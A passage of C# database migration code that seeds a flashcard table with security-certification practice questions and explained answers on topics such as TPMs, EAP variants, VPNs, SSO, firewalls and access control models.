                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 479, "\r\n73. D. A SAN, or Subject Alternate Name, certificate allows\r\nmultiple hostnames to be protected by the same certificate. It is\r\nnot a type of certificate for SAN storage systems. A SAN\r\ncertificate could be self-signed, but that does not make it a SAN\r\ncertificate, and of course the security organization SANS is not a\r\ncertificate authority.\r\n", 3, "\r\n73. Alaina has been told that her organization uses a SAN certificate in their environment. What\r\ndoes this tell Alaina about the certificate in use in her organization?\r\nA. It is used for a storage area network.\r\nB. It is provided by SANS, a network security organization.\r\nC. The certificate is part of a self-signed, self-assigned namespace.\r\nD. The certificate allows multiple hostnames to be protected by the same certificate.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 465, "\r\n59. C. Trusted Platform Modules (TPMs) provide a random\r\nnumber generator, the ability to generate cryptographic keys,\r\nsupport for remote attestation as part of the boot process, as\r\nwell as binding and sealing capabilities. They do not act as\r\ncryptographic processors to speed up Secure Sockets Layer\r\n(SSL) or Transport Layer Security (TLS) traffic.\r\n", 3, "\r\n59. Frank knows that the systems he is deploying have a built-in TPM module. Which of the following\r\ncapabilities is not a feature provided by a TPM?\r\nA. A random number generator\r\nB. Remote attestation capabilities\r\nC. A cryptographic processor used to speed up SSL/TLS\r\nD. The ability to bind and seal data\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 467, "\r\n61. C. The correct answer is to only allow signed components to be\r\nloaded in the browser. Code signing verifies the originator of the\r\ncomponent (such as an ActiveX component) and thus makes\r\nmalware far less likely. Although host-based antimalware is a\r\ngood idea, it is not the best remedy for this specific threat.\r\nBlacklists cannot cover all sites that are infected—just the sites\r\nyou know about. And given that users on Hans’s network visit a\r\nlot of websites, blacklisting is likely to be ineffective. Finally, if\r\nyou block all active content, many websites will be completely\r\nunusable.\r\n", 3, "\r\n61. Hans is a security administrator for a large company. Users on his network visit a wide range\r\nof websites. He is concerned they might get malware from one of these many websites. Which\r\nof the following would be his best approach to mitigate this threat?\r\nA. Implement host-based antivirus.\r\nB. Blacklist known infected sites.\r\nC. Set browsers to allow only signed components.\r\nD. Set browsers to block all active content (ActiveX, JavaScript, etc.).\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 468, "\r\n62. B. Zarmeena has implemented a preshared key, or PSK,\r\nauthentication method. This means that if she needs to change\r\nthe key because a staff member leaves, she will need to have\r\nevery device update their passphrase. For larger deployments,\r\nenterprise authentication can connect to an authentication and\r\nauthorization service, allowing each user to authenticate as\r\nthemselves. This also provides network administrators with a\r\nway to identify individual devices by their authenticated user.\r\nOpen networks do not require authentication, although a captive\r\nportal can be used to require network users to provide\r\ninformation before they are connected to the Internet.\r\n", 3, "\r\n62. Zarmeena has implemented wireless authentication for her network using a passphrase that\r\nshe distributes to each member of her organization. What type of authentication method has\r\nshe implemented?\r\nA. Enterprise\r\nB. PSK\r\nC. Open\r\nD. Captive portal\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 469, "\r\n63. A. EAP-FAST is specifically designed for organizations that\r\nwant to quickly complete reconnections and does not require\r\ncertificates to be installed at the endpoint device. EAP Tunneled\r\nTransport Layer Security (EAP-TTLS) requires client-side\r\ncertificates; EAP-TLS requires mutual authentication, which can\r\nbe slower; and Protected Extensible Authentication Protocol\r\n(PEAP) is similar to EAP-TTLS.\r\n", 3, "\r\n63. Olivia is building a wireless network and wants to implement an Extensible Authentication\r\nProtocol (EAP)-based protocol for authentication. What EAP version should she use if she\r\nwants to prioritize reconnection speed and doesn’t want to deploy client certificates for\r\nauthentication?\r\nA. EAP-FAST\r\nB. EAP-TLS\r\nC. PEAP\r\nD. EAP-TTLS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 470, "\r\n64. A. The correct answer is to implement a virtual desktop\r\ninfrastructure (VDI). If all the desktops are virtualized, then\r\nfrom a single central location you can manage patches,\r\nconfiguration, and software installation. This single\r\nimplementation will solve all the issues mentioned in the\r\nquestion. Restrictive policies are a good idea but are often\r\ndifficult to enforce. Imaging workstations will affect only their\r\noriginal configuration; it won’t keep them patched or prevent\r\nrogue software from being installed. Finally, strong patch\r\nmanagement will address only one of the three concerns.\r\n", 3, "\r\n64. You work at a large company. You are concerned about ensuring that all workstations have\r\na common configuration, that no rogue software is installed, and that all patches are kept up\r\nto date. Which of the following would be the most effective for accomplishing this?\r\nA. Use VDI.\r\nB. Implement restrictive policies.\r\nC. Use an image for all workstations.\r\nD. Implement strong patch management.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 471, "\r\n65. B. Deploying to multiple locations is part of a high availability\r\nstrategy that ensures that losing a datacenter or datacenters in a\r\nsingle region, or loss of network connectivity to that region, will\r\nnot take an infrastructure down. This does not provide greater\r\nresistance to insider attacks, lower costs, or vendor diversity.\r\n", 3, "\r\n65. Naomi has deployed her organization’s cloud-based virtual datacenters to multiple Google\r\ndatacenter locations around the globe. What does this design provide for her systems?\r\nA. Resistance to insider attacks\r\nB. High availability across multiple zones\r\nC. Decreased costs\r\nD. Vendor diversity\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 472, "\r\n66. B. A TLS-based VPN (often called an SSL-based VPN, despite\r\nSSL being outmoded) provides the easiest way for users to use\r\nVPN since it does not require a client. SSL VPNs also work only\r\nfor specific applications rather than making a system appear as\r\nthough it is fully on a remote network. HTML5 is not a VPN\r\ntechnology, but some VPN portals may be built using HTML5.\r\nSecurity Assertion Markup Language (SAML) is not a VPN\r\ntechnology. IPSec VPNs require a client or configuration and are\r\nthus harder for end users to use in most cases.\r\n", 3, "\r\n66. Patrick wants to deploy a virtual private networking (VPN) technology that is as easy for end\r\nusers to use as possible. What type of VPN should he deploy?\r\nA. An IPSec VPN\r\nB. An SSL/TLS VPN\r\nC. An HTML5 L2TP VPN\r\nD. An SAML VPN\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 473, "\r\n67. C. These particular web application attacks are best mitigated\r\nwith proper input validation. Any user input should be checked\r\nfor indicators of cross-site scripting (XSS) or SQL injection.\r\nError handling is always important, but it won’t mitigate these\r\nparticular issues. Stored procedures can be a good way of\r\nensuring SQL commands are standardized, but that won’t\r\nprevent these attacks. Code signing is used for code that is\r\ndownloaded from a web application to the client computer; it is\r\nused to protect the client, not the web application.\r\n", 3, "\r\n67. Olivia is responsible for web application security for her company’s e-commerce server. She is\r\nparticularly concerned about XSS and SQL injection. Which technique would be most\r\neffective in mitigating these attacks?\r\nA. Proper error handling\r\nB. The use of stored procedures\r\nC. Proper input validation\r\nD. Code signing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 474, "\r\n68. C. Isaac can configure a geofence that defines his corporate\r\nbuildings and campus. He can then set up a geofence policy that\r\nwill only allow devices to work while they are inside that\r\ngeofenced area. Patch management, IP filtering, and network\r\nrestrictions are not suitable solutions for this.\r\n", 3, "\r\n68. Isaac wants to prevent corporate mobile devices from being used outside of his company’s\r\nbuildings and corporate campus. What mobile device management (MDM) capability should\r\nhe use to allow this?\r\nA. Patch management\r\nB. IP filtering\r\nC. Geofencing\r\nD. Network restrictions\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 475, "\r\n69. B. Fuzzing is a technique whereby the tester intentionally\r\nenters incorrect values into input fields to see how the\r\napplication will handle it. Static code analysis tools simply scan\r\nthe code for known issues, baselining is the process of\r\nestablishing security standards, and version control simply\r\ntracks changes in the code—it does not test the code.\r\n", 3, "\r\n69. Sophia wants to test her company’s web application to see if it is handling input validation\r\nand data validation properly. Which testing method would be most effective for this?\r\nA. Static code analysis\r\nB. Fuzzing\r\nC. Baselining\r\nD. Version control\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 476, "\r\n70. B. Although hardware security modules (HSMs) provide many\r\ncryptographic functions, they are not used for boot attestation. A\r\nTPM, or Trusted Platform Module, is used for secure boot\r\nattestation.\r\n", 3, "\r\n70. Alaina has implemented an HSM. Which of the following capabilities is not a typical\r\nHSM feature?\r\nA. Encryption and decryption for digital signatures\r\nB. Boot attestation\r\nC. Secure management of digital keys\r\nD. Strong authentication support\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 477, "\r\n71. A. Cynthia should deploy Radio Frequency Identifier (RFID)\r\ncards, which can be read using contactless readers. RFID\r\ntechnology is common and relatively inexpensive, but without\r\nadditional authentication, possession of a card is the only means\r\nof determining if someone is authorized to access a building or\r\nroom. Wi-Fi is not used for contactless cards because of its\r\npower consumption and overhead. Magstripes require a reader\r\nrather than being contactless, and HOTP is a form of one-time\r\npassword system.\r\n", 3, "\r\n71. Cynthia wants to issue contactless cards to provide access to the buildings she is tasked with\r\nsecuring. Which of the following technologies should she deploy?\r\nA. RFID\r\nB. Wi-Fi\r\nC. Magstripe\r\nD. HOTP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 466, "\r\n60. B. Hashing is commonly used in databases to increase the\r\nspeed of indexing and retrieval since it is typically faster to\r\nsearch for a hashed key rather than the original value stored in a\r\ndatabase. Hashing is not a form of encryption, meaning that it is\r\nnot used to encrypt stored data. Hashing is not used to obfuscate\r\ndata or to substitute for sensitive data.\r\n", 3, "\r\n60. What is the primary use of hashing in databases?\r\nA. To encrypt stored data, thus preventing exposure\r\nB. For indexing and retrieval\r\nC. To obfuscate data\r\nD. To substitute for sensitive data, allowing it to be used without exposure\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 507, "\r\n101. A. Elenora could deploy a log aggregator at each location to\r\ncollect and aggregate the logs. Log collection and aggregation\r\nsystems can then filter unneeded log entries, compress the logs,\r\nand forward desired logs to a central security system like a\r\nsecurity information and event management (SIEM) or other log\r\nanalysis collection and analysis tool. A honeypot acts like a\r\ndesirable target, luring attackers in to capture data about their\r\nattacks. A bastion host is designed to resist attacks and normally\r\nprovides a single service to the network on which it resides.\r\n", 3, "\r\n101. Elenora is responsible for log collection and analysis for a company with locations around\r\nthe country. She has discovered that remote sites generate high volumes of log data, which\r\ncan cause bandwidth consumption issues for those sites. What type of technology could she\r\ndeploy to each site to help with this?\r\nA. Deploy a log aggregator.\r\nB. Deploy a honeypot.\r\nC. Deploy a bastion host.\r\nD. None of the above\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 508, "\r\n102. D. Fuzzing is an automated, dynamic software testing\r\ntechnique that sends unexpected and often invalid data to a\r\nprogram to test how it responds. The software is monitored to\r\nsee how it responds to the input, providing additional assurance\r\nthat the program has proper error handling and input validation\r\nbuilt in. Timeboxing is an agile project management technique;\r\nbuffer overflows may occur as part of fuzzing, but are not the\r\nonly technique used or described here; and input validation can\r\nhelp stop fuzzing from causing problems for an application by\r\npreventing out-of-bounds or unwanted data from being\r\naccepted.\r\n", 3, "\r\n102. Dani is performing a dynamic code analysis technique that sends a broad range of data\r\nas inputs to the application she is testing. The inputs include data that is both within the\r\nexpected ranges and types for the program and data that is different and, thus, unexpected\r\nby the program. What code testing technique is Dani using?\r\nA. Timeboxing\r\nB. Buffer overflow\r\nC. Input validation\r\nD. Fuzzing\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 509, "\r\n103. B. Dynamic Host Configuration Protocol (DHCP) snooping can\r\nbe set up on switches to monitor for and stop rogue DHCP traffic\r\nfrom unknown servers. Disabling DHCP snooping would remove\r\nthis feature. Intrusion detection systems (IDSs) cannot stop\r\ntraffic, and blocking DHCP traffic would prevent systems from\r\nacquiring dynamic IP addresses.\r\n", 3, "\r\n103. Tina wants to ensure that rogue DHCP servers are not permitted on the network she maintains.\r\nWhat can she do to protect against this?\r\nA. Deploy an IDS to stop rogue DHCP packets.\r\nB. Enable DHCP snooping.\r\nC. Disable DHCP snooping.\r\nD. Block traffic on the DHCP ports to all systems.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 539, "\r\n133. A. Session persistence makes sure that all of a client’s traffic for\r\na transaction or session goes to the same server or service. The\r\nremaining options do not properly describe how session\r\npersistence works.\r\n", 3, "\r\n133. Christina wants to ensure that session persistence is maintained by her load balancer. What\r\nis she attempting to do?\r\nA. Ensure that all of a client’s requests go to the same server for the duration of a given\r\nsession or transaction.\r\nB. Assign the same internal IP address to clients whenever they connect through the load\r\nbalancer.\r\nC. Ensure that all transactions go to the current server in a round-robin during the time\r\nit is the primary server.\r\nD. Assign the same external IP address to all servers whenever they are the primary\r\nserver assigned by the load balancer.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 540, "\r\n134. B. Data loss prevention (DLP) tools allow sensitive data to be\r\ntagged and monitored so that if a user attempts to send it, they\r\nwill be notified, administrators will be informed, and if\r\nnecessary, the data can be protected using encryption or other\r\nprotection methods before it is sent. Full-disk encryption (FDE)\r\nwould protect data at rest, and S/MIME and POP3S would\r\nprotect mail being retrieved from a server but would not prevent\r\nthe SSNs from being sent.\r\n", 3, "\r\n134. Tara is concerned about staff in her organization sending email with sensitive information\r\nlike customer Social Security numbers (SSNs) included in it. What type of solution can she\r\nimplement to help prevent inadvertent exposures of this type of sensitive data?\r\nA. FDE\r\nB. DLP\r\nC. S/MIME\r\nD. POP3S\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 541, "\r\n135. B. While infrastructure as a service (IaaS) vendors often\r\nprovide strong support for high availability, including\r\nreplication to multiple geographic zones or regions, as well as\r\nhighly reliable and secure storage, they do not allow direct\r\naccess to the underlying hardware in most instances. If Jennifer\r\nrequires direct access to hardware, she will need to deploy to a\r\ndatacenter where she can retain access to the physical servers.\r\n", 3, "\r\n135. Jennifer is considering using an infrastructure as a service cloud provider to host her organization’s\r\nweb application, database, and web servers. Which of the following is not a reason\r\nthat she would choose to deploy to a cloud service?\r\nA. Support for high availability\r\nB. Direct control of underlying hardware\r\nC. Reliability of underlying storage\r\nD. Replication to multiple geographic zones\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 542, "\r\n136. B. Out-of-band (OOB) management uses separate management\r\ninterfaces, as shown in the figure, or a different connectivity\r\nmethod than the normal connection to provide a secure means\r\nof managing systems. A DMZ, or demilitarized zone, is a security\r\nzone that is typically exposed to the world and is thus less\r\ntrusted and more exposed. In-band management uses common\r\nprotocols like Secure Shell (SSH) or HTTPS to manage devices\r\nvia their normal interfaces or network connections. Transport\r\nLayer Security (TLS) is a security protocol, not a management\r\ninterface.\r\n", 3, "\r\n136. This image shows an example of a type of secure management interface. What term\r\ndescribes using management interfaces or protected alternate means to manage devices\r\nand systems?\r\nSwitch\r\nRemote\r\nconsole\r\naccess\r\nNetwork ports Console port\r\nA. A DMZ\r\nB. Out-of-band management\r\nC. In-band management\r\nD. A TLS\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 543, "\r\n137. A. Key escrow provides encryption keys to a third party so that\r\nthey can be released to an appropriate party if certain conditions\r\nare met. Although this means that the keys are out of the control\r\nof the owning or responsible party, in many cases the need to\r\nhave a recoverable or accessible way to get to the keys overrides\r\nthe requirement to keep the keys in a single individual or\r\norganization’s hands. The remaining options were made up, but\r\nyou may encounter the term “key recovery,” which is a process\r\nwhere law enforcement or other parties may recover keys when\r\nneeded using a process that provides them with an access key or\r\ndecryption key that may not be the same key as the key used by\r\nthe original encryption user.\r\n", 3, "\r\n137. Chris has provided the BitLocker encryption keys for computers in his department to his\r\norganization’s security office so that they can decrypt computers in the event of a breach of\r\ninvestigation. What is this concept called?\r\nA. Key escrow\r\nB. A BitLocker Locker\r\nC. Key submission\r\nD. AES jail\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 544, "\r\n138. D. Boot attestation requires systems to track and measure the\r\nboot process and to then attest to a system that the process was\r\nsecure. Secure boot, which is a related concept, allows only\r\ntrusted software to be run using previously hashed values to\r\nensure the process is secure. BOOTP and BIOS are not involved\r\nin this process, instead, Unified Extensible Firmware Interface\r\n(UEFI) firmware supports both secure boot and boot attestation.\r\n", 3, "\r\n138. Marek has configured systems in his network to perform boot attestation. What has he configured\r\nthe systems to do?\r\nA. To run only trusted software based on previously stored hashes using a chained boot\r\nprocess\r\nB. To notify a BOOTP server when the system has booted up\r\nC. To hash the BIOS of the system to ensure that the boot process has occurred securely\r\nD. To notify a remote system or management tool that the boot process was secure using\r\nmeasurements from the boot process\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 545, "\r\n139. A. The correct answer is that OpenID is an authentication\r\nservice often done by a third party, and it can be used to sign\r\ninto any website that accepts OpenID. Kerberos is a network\r\nauthentication protocol for use within a domain. New\r\nTechnology LAN Manager (NTLM) is an older Windows\r\nauthentication protocol. Shibboleth is a single sign-on system,\r\nbut it works with federated systems.\r\n", 3, "\r\n139. You have been asked to find an authentication service that is handled by a third party. The\r\nservice should allow users to access multiple websites, as long as they support the thirdparty\r\nauthentication service. What would be your best choice?\r\nA. OpenID\r\nB. Kerberos\r\nC. NTLM\r\nD. Shibboleth\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 546, "\r\n140. C. Disabling remote registry access for systems that do not\r\nrequire it can prevent remote registry modification and reads.\r\nThis is a recommended best practice whenever possible, but\r\nsome systems may require remote registry access for\r\nmanagement or other reasons. The Windows registry is not\r\nindependently patched, the registry needs to be readable and\r\nwritable to have a functional Windows system, and there is no\r\nmode that encrypts user keys.\r\n", 3, "\r\n140. Which of the following steps is a common way to harden the Windows registry?\r\nA. Ensure the registry is fully patched.\r\nB. Set the registry to read-only mode.\r\nC. Disable remote registry access if not required.\r\nD. Encrypt all user-mode registry keys.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 547, "\r\n141. D. Maximizing coverage overlap would cause greater\r\ncontention between access points. Instead, installations should\r\nminimize overlap without leaving dead spots in important areas.\r\nPerforming a site survey, controlling power levels and adjusting\r\nthem to minimize contention, and designing around the\r\nconstruction materials of a building are all important parts of\r\ndesigning the physical layout and placement of WAPs.\r\nFortunately, modern enterprise wireless networks have\r\nadvanced intelligent features that help do many of these things\r\nsomewhat automatically.\r\n", 3, "\r\n141. Lois is designing the physical layout for her wireless access point (WAP) placement in her\r\norganization. Which of the following items is not a common concern when designing a\r\nWAP layout?\r\nA. Determining construction material of the walls around the access points\r\nB. Assessing power levels from other access points\r\nC. Performing a site survey\r\nD. Maximizing coverage overlap\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 548, "\r\n142. B. Disabling the account is the best option to meet Mark’s\r\nneeds. Disabling an account will leave it in a different state than\r\nan active account or one with a changed password, which should\r\nbe noted by support staff if Gabby called and asked to change\r\nher password. That means that there is less risk of a disgruntled\r\nemployee or an attacker successfully gaining access to the\r\naccount. At the same time, disabling is less destructive than\r\ndeleting the account, making it faster to restore and preserving\r\nher files and other materials. Most organizations will choose to\r\nhave a time limit for how long an account can be in a disabled\r\nstate without review or moving to another account state to help\r\nensure that disabled accounts do not build up over time.\r\n", 3, "\r\n142. Gabby has been laid off from the organization that she has worked at for almost a decade.\r\nMark needs to make sure that Gabby’s account is securely handled after her last day of\r\nwork. What can he do to her account as an interim step to best ensure that files are still\r\naccessible and that the account could be returned to use if Gabby returns after the layoff?\r\nA. Delete the account and re-create it when it is needed.\r\nB. Disable the account and reenable it if it is needed.\r\nC. Leave the account active in case Gabby returns.\r\nD. Change the password to one Gabby does not know.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 549, "\r\n143. A. Attribute-based access control (ABAC) looks at a group of\r\nattributes, in addition to the login username and password, to\r\nmake decisions about whether or not to grant access. One of the\r\nattributes examined is the location of the person. Since the users\r\nin this company travel frequently, they will often be at new\r\nlocations, and that might cause ABAC to reject their logins.\r\nWrong passwords can certainly prevent login, but are not\r\nspecific to ABAC. ABAC does not prevent remote access, and a\r\nfirewall can be configured to allow, or prohibit, any traffic you\r\nwish.\r\n", 3, "\r\n143. Mason is responsible for security at a company that has traveling salespeople. The company\r\nhas been using ABAC for access control to the network. Which of the following is an issue\r\nthat is specific to ABAC and might cause it to incorrectly reject logins?\r\nA. Geographic location\r\nB. Wrong password\r\nC. Remote access is not allowed by ABAC.\r\nD. Firewalls usually block ABAC.\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 538, "\r\n132. C. OAuth (Open Authorization) is an open standard for tokenbased\r\nauthentication and authorization on the Internet and\r\nallows an end user’s account information to be used by thirdparty\r\nservices, without exposing the user’s password. Kerberos is\r\na network authentication protocol and not used for crossdomain/\r\nservice authentication. Security Assertion Markup\r\nLanguage (SAML) is an XML-based, open-standard data format\r\nfor exchanging authentication and authorization data between\r\nparties. OpenID is an authentication service often provided by a\r\nthird party, and it can be used to sign into any website that\r\naccepts OpenID. It would be possible for this to work, but only\r\nwith websites that support OpenID, so it is not as good a\r\nsolution as OAuth.\r\n", 3, "\r\n132. You work for a social media website. You wish to integrate your users’ accounts with\r\nother web resources. To do so, you need to allow authentication to be used across different\r\ndomains, without exposing your users’ passwords to these other services. Which of the following\r\nwould be most helpful in accomplishing this goal?\r\nA. Kerberos\r\nB. SAML\r\nC. OAuth\r\nD. OpenID\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 550, "\r\n144. B. Single Sign-On (SSO) is designed specifically to address this\r\nrisk and would be the most helpful. Users have only a single\r\nlogon to remember; thus, they have no need to write down the\r\npassword. OAuth (Open Authorization) is an open standard for\r\ntoken-based authentication and authorization on the Internet. It\r\ndoes not eliminate the use or need for multiple passwords.\r\nMultifactor authentication helps prevent risks due to lost\r\npasswords, but does not remove the need for multiple passwords\r\nby itself. Security Assertion Markup Language (SAML) and\r\nLightweight Directory Access Protocol (LDAP) do not stop users\r\nfrom needing to remember multiple passwords.\r\n", 3, "\r\n144. Darrell is concerned that users on his network have too many passwords to remember and\r\nmight write down their passwords, thus creating a significant security risk. Which of the following\r\nwould be most helpful in mitigating this issue?\r\nA. Multifactor authentication\r\nB. SSO\r\nC. SAML\r\nD. LDAP\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 552, "\r\n146. B. Segmentation needs between multiple cloud virtual\r\ndatacenters, the cost of operating the firewall service, and the\r\nvisibility into traffic provided by the cloud service provider are\r\nall design elements Ed will need to consider. He won’t, however,\r\nneed to worry about hardware access for updates. Instead, he is\r\nlikely to either use a virtual cloud appliance or built-in firewall\r\nfunctionality provided by the cloud infrastructure service\r\nprovider.\r\n", 3, "\r\n146. Ed is designing the security architecture for his organization’s move into an infrastructure as\r\na service cloud environment. In his on-site datacenter, he has deployed a firewall in front of\r\nthe datacenter network to protect it, and he has built rules that allow necessary services in,\r\nas well as outbound traffic for updates and similar needs. He knows that his cloud environment\r\nwill be different. Which of the following is not a typical concern for cloud firewall\r\ndesigns?\r\nA. Segmentation requirements for virtual private clouds (VPCs)\r\nB. Hardware access for updates\r\nC. The cost of operating firewall services in the cloud\r\nD. OSI layers and visibility of traffic to cloud firewalls\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 553, "\r\n147. B. Tokens are physical devices that often contain cryptographic\r\ndata for authentication. They can store digital certificates for use\r\nwith authentication. OAuth (Open Authorization) is an open\r\nstandard for token-based authentication and authorization on\r\nthe Internet. The user still must remember a password. OpenID\r\nis a third-party authentication service, and just as with OAuth,\r\nthe user also still must remember a password. Role-based access\r\ncontrol and rule-based access control (which both use the\r\nacronym RBAC) are access control models.\r\n", 3, "\r\n147. Amelia is looking for a network authentication method that can use digital certificates and\r\ndoes not require end users to remember passwords. Which of the following would best fit\r\nher requirements?\r\nA. OAuth\r\nB. Tokens\r\nC. OpenID\r\nD. RBAC\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 554, "\r\n148. A. Internal services like this are part of an intranet, a network,\r\nor website only accessible to individuals and systems inside of a\r\ncompany. Extranets are private networks that allow access to\r\npartners or customers, but not to the general public. A\r\ndemilitarized zone (DMZ) is a network segment exposed to the\r\nInternet or another untrusted network. A TTL is a network term\r\nthat means time to live, and it determines how many hops a\r\npacket can make before it is no longer able to be sent to another\r\nhop.\r\n", 3, "\r\n148. Damian has designed and built a website that is accessible only inside of a corporate network.\r\nWhat term is used to describe this type of internal resource?\r\nA. An intranet\r\nB. An extranet\r\nC. A DMZ\r\nD. A TTL\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 555, "\r\n149. B. This question describes a stateless firewall, which looks at\r\nevery packet to make decisions about what will be allowed\r\nthrough it. Stateful firewalls pay attention the conversations and\r\nallow packets in a conversation between devices to pass through\r\nonce it has verified the initial exchange. Next-generation\r\nfirewalls (NGFWs) build in a wide variety of security services.\r\nApplication-layer firewalls understand applications that run\r\nthrough them and provide deeper packet analysis capabilities to\r\nblock unwanted application layer traffic.\r\n", 3, "\r\n149. The firewall that Walter has deployed looks at every packet sent by systems that travel\r\nthrough it, ensuring that each packet matches the rules that it operates and filters traffic by.\r\nWhat type of firewall is being described?\r\nA. Next generation\r\nB. Stateless\r\nC. Application layer\r\nD. Stateful\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 556, "\r\n150. C. Hardware security modules are available as smartcards,\r\nmicroSD cards, and USB thumb drives in addition to their\r\nfrequent deployment as appliances in enterprise use. Nancy\r\ncould purchase a certified and tested MicroSD card–based HSM\r\nthat would protect her keys in a secure way. An applicationbased\r\npublic key infrastructure (PKI) would not provide the\r\nsame level of security on most mobile devices without specially\r\ndesigned hardware, which is not mentioned in this problem.\r\nOPAL is a hardware-based encryption standard and does not\r\nprovide key management, and an offline certificate authority\r\n(CA) would not help in this circumstance.\r\n", 3, "\r\n150. Nancy wants to protect and manage her RSA keys while using a mobile device. What type\r\nof solution could she purchase to ensure that the keys are secure so that she can perform\r\npublic key authentication?\r\nA. An application-based PKI\r\nB. An OPAL-encrypted drive\r\nC. A MicroSD HSM\r\nD. An offline CA\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
                values: new object[] { 557, "\r\n151. D. Both the Windows and Linux filesystems work based on a\r\ndiscretionary access control scheme where file and directory\r\nowners can determine who can access, change, or otherwise\r\nwork with files under their control. Role-based access controls\r\nsystems determine rights based on roles that are assigned to\r\nusers. Rule-based access control systems use a series of rules to\r\ndetermine which actions can occur, and mandatory access\r\ncontrol systems enforce control at the operating system level.\r\n", 3, "\r\n151. Oliver needs to explain the access control scheme used by both the Windows and Linux filesystems.\r\nWhat access control scheme do they implement by default?\r\nA. Role-based access control\r\nB. Mandatory access control\r\nC. Rule-based access control\r\nD. Discretionary access control\r\n", "" });

            migrationBuilder.InsertData(
                table: "Flashcards",
                columns: new[] { "Id", "Back", "CategoryId", "Front", "Name" },
